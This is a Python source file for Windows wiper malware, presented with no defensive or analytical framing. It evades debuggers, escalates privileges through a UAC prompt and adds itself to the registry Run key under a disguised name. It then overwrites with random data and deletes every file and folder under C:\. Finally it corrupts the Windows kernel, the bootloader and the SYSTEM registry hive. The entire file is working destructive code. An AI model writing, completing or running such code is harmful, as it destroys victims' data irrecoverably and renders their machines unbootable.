import os
import shutil
import random
import ctypes
import sys
import winreg

# Obfuscated function names
def a(): return os.path
def b(): return shutil
def c(): return random
def d(): return ctypes
def e(): return sys
def f(): return winreg

# Anti-debugging: Check for common debugging tools
def anti_debug():
    debug_tools = ["ollydbg.exe", "idaq.exe", "windbg.exe", "x64dbg.exe"]
    for tool in debug_tools:
        if os.path.exists(os.path.join("C:\\", tool)):
            sys.exit()

# Overwrite file with random data
def overwrite_file(file_path):
    try:
        with open(file_path, 'wb') as f:
            f.write(os.urandom(1024))  # Overwrite with random data
    except:
        pass

# Delete files and folders
def delete_files_and_folders(path):
    for root, dirs, files in os.walk(path, topdown=False):
        for file in files:
            file_path = os.path.join(root, file)
            overwrite_file(file_path)  # Overwrite file with random data
            try:
                os.remove(file_path)  # Delete the file
            except:
                pass

        for dir in dirs:
            dir_path = os.path.join(root, dir)
            try:
                shutil.rmtree(dir_path)  # Delete the folder
            except:
                pass

# Corrupt critical system files
def corrupt_system_files():
    critical_files = [
        "C:\\Windows\\System32\\ntoskrnl.exe",  # Windows kernel
        "C:\\Windows\\System32\\winload.exe",   # Windows bootloader
        "C:\\Windows\\System32\\config\\SYSTEM" # Windows registry
    ]
    for file in critical_files:
        if os.path.exists(file):
            overwrite_file(file)  # Overwrite critical system files

# Add to startup
def add_to_startup():
    try:
        key = f().OpenKey(f().HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, f().KEY_WRITE)
        f().SetValueEx(key, "reagentc", 0, f().REG_SZ, sys.executable)
        f().CloseKey(key)
    except:
        pass

# Run as administrator
def run_as_admin():
    if d().windll.shell32.IsUserAnAdmin() == 0:
        d().windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

# Main function
def main():
    anti_debug()  # Check for debugging tools
    run_as_admin()  # Request administrator privileges
    add_to_startup()  # Add to startup
    delete_files_and_folders("C:\\")  # Delete and overwrite files
    corrupt_system_files()  # Corrupt critical system files

if __name__ == "__main__":
    main()
